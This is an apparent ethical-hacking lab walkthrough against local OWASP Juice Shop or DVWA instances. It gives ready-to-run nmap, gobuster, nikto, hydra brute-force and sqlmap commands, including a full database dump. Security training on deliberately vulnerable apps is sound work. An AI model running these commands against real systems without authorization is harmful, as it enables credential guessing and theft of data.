Offensive Cybersecurity Lab

Ethical hacking walkthrough: reconnaissance, enumeration, exploitation, and post-exploitation against a vulnerable web app (OWASP Juice Shop/DVWA).

Download Attack Cheat Sheet Download Wordlists (sample) Sample Nmap Output

Lab Setup

  • Attacker: Kali Linux (or Parrot) VM
  • Target: OWASP Juice Shop or DVWA in Docker: docker run -d -p 3000:3000 bkimminich/juice-shop
  • Network: Host-only or NAT; ensure attacker can reach target (e.g., http://127.0.0.1:3000)

Phases

1) Recon & Scanning

# Host discovery
nmap -sn 192.168.56.0/24

# Service/version scan
nmap -sV -sC -p- 127.0.0.1

# Web enumeration
whatweb http://127.0.0.1:3000
gobuster dir -u http://127.0.0.1:3000 -w /usr/share/wordlists/dirb/common.txt

2) Vulnerability Discovery

# Nikto quick scan
nikto -h http://127.0.0.1:3000

# SQLi discovery (Burp/OWASP ZAP recommended)
sqlmap -u "http://127.0.0.1:3000/rest/products/search?q=test" --level=5 --risk=2 --dbs

3) Exploitation

# Login brute force (example; ensure authorized!)
hydra -l admin -P wordlists.txt 127.0.0.1 http-post-form \
"/login:email=^USER^&password=^PASS^:S=Logout"

# SQLi exploit via sqlmap
sqlmap -u "http://127.0.0.1:3000/rest/products/search?q=test" --dump-all --batch
